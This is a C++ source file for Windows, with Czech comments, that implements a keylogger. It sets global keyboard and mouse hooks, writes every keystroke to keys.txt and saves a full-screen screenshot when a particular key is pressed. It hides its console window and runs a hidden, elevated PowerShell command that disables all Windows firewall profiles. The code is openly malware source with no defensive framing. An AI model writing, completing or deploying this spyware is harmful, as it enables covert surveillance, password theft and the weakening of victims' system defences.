#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>

// struktury pro informace o Hooku
static HHOOK hooks[2];
static std::fstream keyFile;

static PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
{
	BITMAP bmp;
	PBITMAPINFO pbmi;
	WORD    cClrBits;

	// Retrieve the bitmap color format, width, and height.  
	GetObject(hBmp, sizeof(BITMAP), (LPSTR)&bmp);
		

	// Convert the color format to a count of bits.  
	cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
	if (cClrBits == 1)
		cClrBits = 1;
	else if (cClrBits <= 4)
		cClrBits = 4;
	else if (cClrBits <= 8)
		cClrBits = 8;
	else if (cClrBits <= 16)
		cClrBits = 16;
	else if (cClrBits <= 24)
		cClrBits = 24;
	else cClrBits = 32;

	// Allocate memory for the BITMAPINFO structure. (This structure  
	// contains a BITMAPINFOHEADER structure and an array of RGBQUAD  
	// data structures.)  

	if (cClrBits < 24)
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
			sizeof(BITMAPINFOHEADER) +
			sizeof(RGBQUAD) * (1 << cClrBits));

	// There is no RGBQUAD array for these formats: 24-bit-per-pixel or 32-bit-per-pixel 

	else
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
			sizeof(BITMAPINFOHEADER));

	// Initialize the fields in the BITMAPINFO structure.  

	pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	pbmi->bmiHeader.biWidth = bmp.bmWidth;
	pbmi->bmiHeader.biHeight = bmp.bmHeight;
	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
	if (cClrBits < 24)
		pbmi->bmiHeader.biClrUsed = (1 << cClrBits);

	// If the bitmap is not compressed, set the BI_RGB flag.  
	pbmi->bmiHeader.biCompression = BI_RGB;

	// Compute the number of bytes in the array of color  
	// indices and store the result in biSizeImage.  
	// The width must be DWORD aligned unless the bitmap is RLE 
	// compressed. 
	pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8
		* pbmi->bmiHeader.biHeight;
	// Set biClrImportant to 0, indicating that all of the  
	// device colors are important.  
	pbmi->bmiHeader.biClrImportant = 0;
	return pbmi;
}
static void CreateBMPFile(LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP)
{
	HANDLE hf;                 // file handle  
	BITMAPFILEHEADER hdr;       // bitmap file-header  
	PBITMAPINFOHEADER pbih;     // bitmap info-header  
	LPBYTE lpBits;              // memory pointer  
	DWORD dwTotal;              // total count of bytes  
	DWORD cb;                   // incremental count of bytes  
	BYTE *hp;                   // byte pointer  
	DWORD dwTmp;
	HDC hDC = CreateCompatibleDC(GetWindowDC(GetDesktopWindow()));

	pbih = (PBITMAPINFOHEADER)pbi;
	lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

	if (!lpBits)
	{
	}//errhandler("GlobalAlloc", hwnd);

	// Retrieve the color table (RGBQUAD array) and the bits  
	// (array of palette indices) from the DIB.  
	if (!GetDIBits(hDC, hBMP, 0, (WORD)pbih->biHeight, lpBits, pbi,
		DIB_RGB_COLORS))
	{
		//errhandler("GetDIBits", hwnd);
	}

	// Create the .BMP file.  
	hf = CreateFile(pszFile,
		GENERIC_READ | GENERIC_WRITE,
		(DWORD)0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL);
	if (hf == INVALID_HANDLE_VALUE)
	{
	}//errhandler("CreateFile", hwnd);
	hdr.bfType = 0x4d42;        // 0x42 = "B" 0x4d = "M"  
								// Compute the size of the entire file.  
	hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) +
		pbih->biSize + pbih->biClrUsed
		* sizeof(RGBQUAD) + pbih->biSizeImage);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;

	// Compute the offset to the array of color indices.  
	hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) +
		pbih->biSize + pbih->biClrUsed
		* sizeof(RGBQUAD);

	// Copy the BITMAPFILEHEADER into the .BMP file.  
	if (!WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER),
		(LPDWORD)&dwTmp, NULL))
	{
		//errhandler("WriteFile", hwnd);
	}

	// Copy the BITMAPINFOHEADER and RGBQUAD array into the file.  
	if (!WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER)
		+ pbih->biClrUsed * sizeof(RGBQUAD),
		(LPDWORD)&dwTmp, (NULL)))
	{
	}//errhandler("WriteFile", hwnd);

	// Copy the array of color indices into the .BMP file.  
	dwTotal = cb = pbih->biSizeImage;
	hp = lpBits;
	if (!WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL))
	{
	}//errhandler("WriteFile", hwnd);

	// Close the .BMP file.  
	if (!CloseHandle(hf))
	{
	}//errhandler("CloseHandle", hwnd);

	// Free memory.  
	GlobalFree((HGLOBAL)lpBits);
}
static void captureScreenshot()
{
	HDC hdc = GetDC(nullptr); // get the desktop device context
	HDC hDest = CreateCompatibleDC(hdc); // create a device context to use yourself

										 // get the height and width of the screen
	int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);

	// create a bitmap
	HBITMAP hbDesktop = CreateCompatibleBitmap(hdc, width, height);

	// use the previously created device context with the bitmap
	SelectObject(hDest, hbDesktop);

	// copy from the desktop device context to the bitmap device context
	// call this once per 'frame'
	BitBlt(hDest, 0, 0, width, height, hdc, 0, 0, SRCCOPY);

	// after the recording is done, release the desktop context you got..
	ReleaseDC(nullptr, hdc);

	// ..and delete the context you created
	DeleteDC(hDest);

	CreateBMPFile("test.bmp", CreateBitmapInfoStruct(hbDesktop), hbDesktop);
}

static LRESULT CALLBACK KeyCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			keyFile << (char) MapVirtualKey(kbdStruct.vkCode, MAPVK_VK_TO_CHAR) << std::endl;
			keyFile.flush();
			
			if (kbdStruct.vkCode == 65)
			{
				captureScreenshot();
			}
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(hooks[0], nCode, wParam, lParam);
}
static LRESULT CALLBACK MouseCallback(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	if (nCode >= 0)
	{
		if (wParam == WM_MOUSEMOVE)
		{
			MSLLHOOKSTRUCT* data = (MSLLHOOKSTRUCT*) lParam;
			printf("[%d, %d]\n", data->pt.x, data->pt.y);
		}
	}

	return CallNextHookEx(hooks[1], nCode, wParam, lParam);
}


static void hideWindow()
{
	ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_HIDE); // hide window
}
static void setHooks()
{
	if (!(hooks[0] = SetWindowsHookEx(
		WH_KEYBOARD_LL,	// low level keyboard
		KeyCallback,   // callback
		nullptr,		// current process/dll
		0)))			// capture all threads
	{
		MessageBox(nullptr, "Failed to install hook!", "Error", MB_ICONERROR);
	}

	if (!(hooks[1] = SetWindowsHookEx(
		WH_MOUSE_LL,	// low level keyboard
		MouseCallback,   // callback
		nullptr,		// current process/dll
		0)))			// capture all threads
	{
		MessageBox(nullptr, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}
static void releaseHooks()
{
	for (int i = 0; i < 2; i++)
	{
		UnhookWindowsHookEx(hooks[i]);
	}
}
static BOOL WINAPI closeCallback(DWORD unused)
{
	releaseHooks();
	return true;
}

void disableFirewall()
{
	std::string command = "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False";
	std::string args = "-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"" + command + "\"";

	SHELLEXECUTEINFO shExInfo = { 0 };
	shExInfo.cbSize = sizeof(shExInfo);
	shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS; // return process handle
	shExInfo.hwnd = 0;
	shExInfo.lpVerb = "runas";
	shExInfo.lpFile = "powershell.exe";
	shExInfo.lpParameters = args.c_str();
	shExInfo.lpDirectory = 0;
	shExInfo.nShow = SW_HIDE;
	shExInfo.hInstApp = 0;

	if (ShellExecuteEx(&shExInfo))
	{
		WaitForSingleObject(shExInfo.hProcess, INFINITE);
		CloseHandle(shExInfo.hProcess);
	}
}
void runKeylogger()
{
	keyFile = std::fstream("keys.txt", std::ios::out | std::ios::app);

	hideWindow();
	setHooks();
	atexit(releaseHooks);

	disableFirewall();

	SetConsoleCtrlHandler(closeCallback, true);
	
	// event loop
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{

	}
}
